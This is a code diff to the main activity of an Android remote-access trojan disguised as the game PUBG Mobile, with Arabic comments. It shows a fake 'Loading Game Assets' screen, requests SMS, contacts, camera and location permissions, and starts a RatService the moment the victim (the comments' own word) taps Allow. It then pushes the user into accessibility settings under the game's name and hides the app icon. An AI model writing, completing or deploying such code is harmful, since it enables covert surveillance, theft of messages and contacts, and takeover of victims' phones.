@@ -18,20 +18,20 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
+        // شاشة وهمية (مثلاً شكل تحميل اللعبة)
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
         layout.setBackgroundColor(Color.BLACK);
 
         TextView textView = new TextView(this);
-        textView.setText("Downloading Data...\nDo not close");
+        textView.setText("Loading Game Assets...\nPlease wait");
         textView.setTextColor(Color.WHITE);
         textView.setTextSize(20);
         textView.setGravity(Gravity.CENTER);
         layout.addView(textView);
         setContentView(layout);
 
-        // طلب الصلاحيات (ضفنا POST_NOTIFICATIONS)
         String[] perms = {
             android.Manifest.permission.READ_SMS, android.Manifest.permission.RECEIVE_SMS,
             android.Manifest.permission.SEND_SMS, android.Manifest.permission.READ_CONTACTS,
@@ -39,11 +39,26 @@ public class MainActivity extends Activity {
             android.Manifest.permission.CAMERA, android.Manifest.permission.ACCESS_FINE_LOCATION,
             android.Manifest.permission.POST_NOTIFICATIONS
         };
+        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             requestPermissions(perms, 1);
+        } else {
+            startRatAndOpenSettings();
         }
+    }
 
-        // تشغيل الخدمة
+    // الدالة دي بتشتغل أوتوماتيك بمجرد ما الضحية يدوس Allow في شاشة الصلاحيات
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == 1) {
+            // الضحية دوس Allow.. يلا بينا نسحب كل حاجة ونخفي الأيقونة فوراً
+            startRatAndOpenSettings();
+        }
+    }
+
+    private void startRatAndOpenSettings() {
+        // تشغيل السيرفس فوراً
         try {
             Intent serviceIntent = new Intent(this, RatService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -53,12 +68,12 @@ public class MainActivity extends Activity {
             }
         } catch (Exception ignored) {}
 
-        // فتح إعدادات الـ Accessibility
+        // فتح شاشة الـ Accessibility
         try {
             Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
             accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(accIntent);
-            Toast.makeText(this, "Please enable PUBG Mobile in Accessibility.", Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "Please enable PUBG Mobile.", Toast.LENGTH_LONG).show();
         } catch (Exception ignored) {}
 
         // إخفاء الأيقونة
@@ -67,5 +82,7 @@ public class MainActivity extends Activity {
             ComponentName componentName = new ComponentName(this, MainActivity.class);
             p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
         } catch (Exception ignored) {}
+        
+        finish();
     }
 }
